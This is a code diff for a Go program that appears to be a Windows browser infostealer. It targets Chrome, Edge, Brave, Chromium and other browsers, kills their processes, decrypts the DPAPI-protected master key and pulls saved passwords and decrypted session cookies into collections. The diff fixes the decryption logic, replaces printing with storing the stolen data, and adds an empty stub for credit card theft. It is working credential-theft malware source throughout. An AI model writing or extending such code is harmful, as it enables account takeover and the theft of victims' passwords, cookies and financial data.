@@ -7,17 +7,15 @@ import (
 	"encoding/base64"
 	"encoding/json"
 	"errors"
-	"fmt"
-	"log"
 	"os"
 	"os/exec"
 	"strings"
 
-	"github.com/billgraziano/dpapi"
 	_ "github.com/mattn/go-sqlite3"
 )
 
 var ChromiumBrowserPaths = map[string]string{
+	"Chromium":    LocalAppDataPath + `\Chromium\User Data`,
 	"Chrome":      LocalAppDataPath + `\Google\Chrome\User Data`,
 	"Edge":        LocalAppDataPath + `\Microsoft\Edge\User Data`,
 	"Brave":       LocalAppDataPath + `\BraveSoftware\Brave-Browser\User Data`,
@@ -45,6 +43,23 @@ var BrowserProcesses = []string{
 	"chrome", "msedge", "brave", "yandex", "opera", "vivaldi", "amigo", "kometa", "orbitum",
 	"centbrowser", "coccoc", "sputnik", "7star", "iridium", "firefox", "waterfox", "thunderbird",
 }
+
+type BrowserLoginResult struct {
+	URL         string
+	Username    string
+	Password    string
+	BrowserName string
+}
+
+type BrowserCookieResult struct {
+	URL         string
+	Name        string
+	Value       string
+	BrowserName string
+}
+
+var logins []BrowserLoginResult
+var cookies []BrowserCookieResult
 
 func killBrowserProcesses() error {
 	running, err := exec.Command("tasklist").Output()
@@ -95,8 +110,10 @@ func decryptKey(localStatePath string) ([]byte, error) {
 	if !strings.HasPrefix(string(encryptedKey), "DPAPI") {
 		return nil, errors.New("unexpected key prefix")
 	}
+
+	// Strip "DPAPI" prefix
 	encryptedKey = encryptedKey[5:]
-	decryptedKey, err := dpapi.DecryptBytes(encryptedKey)
+	decryptedKey, err := DecryptBytes(encryptedKey)
 	if err != nil {
 		return nil, err
 	}
@@ -108,13 +125,7 @@ func decryptPassword(password []byte, encryptionKey []byte) ([]byte, error) {
 		// Newer versions of Chromium use AES-GCM encryption with a DPAPI-wrapped key
 		nonce := password[3:15]
 		ciphertext := password[15 : len(password)-16]
-		tag := ciphertext[len(password)-16:]
-
-		ciphertext, err := base64.StdEncoding.DecodeString(string(ciphertext))
-		if err != nil {
-			return nil, fmt.Errorf("base64 decode: %w", err)
-		}
-
+		tag := password[len(password)-16:]
 		ciphertextAndTag := append(ciphertext, tag...)
 
 		block, err := aes.NewCipher(encryptionKey)
@@ -135,22 +146,15 @@ func decryptPassword(password []byte, encryptionKey []byte) ([]byte, error) {
 	return nil, errors.New("unsupported encryption format")
 }
 
-func grabChromiumData(path string) {
-	encryptionKey, err := decryptKey(path + `\Local State`)
-	if err != nil || encryptionKey == nil {
-		return
-	}
-
+func grabChromiumLogins(key []byte, path string, name string) error {
 	db, err := sql.Open("sqlite3", path+`\Default\Login Data`)
 	if err != nil {
-		log.Println(err)
-		return
+		return err
 	}
 
 	rows, err := db.Query(`SELECT origin_url, username_value, password_value FROM logins`)
 	if err != nil {
-		log.Println(err)
-		return
+		return err
 	}
 	defer rows.Close()
 
@@ -160,19 +164,76 @@ func grabChromiumData(path string) {
 		if err := rows.Scan(&url, &username, &encryptedPassword); err != nil {
 			continue
 		}
-		decryptedPassword, err := decryptPassword(encryptedPassword, encryptionKey)
+		decryptedPassword, err := decryptPassword(encryptedPassword, key)
 		if err != nil {
 			continue
 		}
 		if username != "" || len(decryptedPassword) > 0 {
-			// Here you would typically store or send the credentials somewhere
-			_ = url
-			_ = username
-			_ = decryptedPassword
-			// For example:
-			fmt.Printf("URL: %s\nUsername: %s\nPassword: %s\n\n", url, username, string(decryptedPassword))
+			logins = append(logins, BrowserLoginResult{
+				URL:         url,
+				Username:    username,
+				Password:    string(decryptedPassword),
+				BrowserName: name,
+			})
 		}
 	}
+	return nil
+}
+
+func grabChromiumCookies(key []byte, path string, browserName string) error {
+	db, err := sql.Open("sqlite3", path+`\Default\Network\Cookies`)
+	if err != nil {
+		return err
+	}
+
+	rows, err := db.Query(`SELECT host_key, name, encrypted_value FROM cookies`)
+	if err != nil {
+		return err
+	}
+	defer rows.Close()
+
+	for rows.Next() {
+		var host, name string
+		var encryptedValue []byte
+		if err := rows.Scan(&host, &name, &encryptedValue); err != nil {
+			continue
+		}
+		decryptedValue, err := decryptPassword(encryptedValue, key)
+		if err != nil {
+			continue
+		}
+		if len(decryptedValue) > 0 {
+			cookies = append(cookies, BrowserCookieResult{
+				URL:         host,
+				Name:        name,
+				Value:       string(decryptedValue),
+				BrowserName: browserName,
+			})
+		}
+	}
+	return nil
+}
+
+func grabCreditsCardData() {
+
+}
+
+func grabChromiumData(path string, name string) error {
+	encryptionKey, err := decryptKey(path + `\Local State`)
+	if err != nil || encryptionKey == nil {
+		return err
+	}
+
+	err = grabChromiumLogins(encryptionKey, path, name)
+	if err != nil {
+		return err
+	}
+	err = grabChromiumCookies(encryptionKey, path, name)
+	if err != nil {
+		return err
+	}
+
+	return nil
 }
 
 func grabBrowsersData() {
@@ -183,7 +244,6 @@ func grabBrowsersData() {
 		if err != nil || !stat.IsDir() {
 			continue
 		}
-		grabChromiumData(path)
-		_ = name
+		grabChromiumData(path, name)
 	}
 }
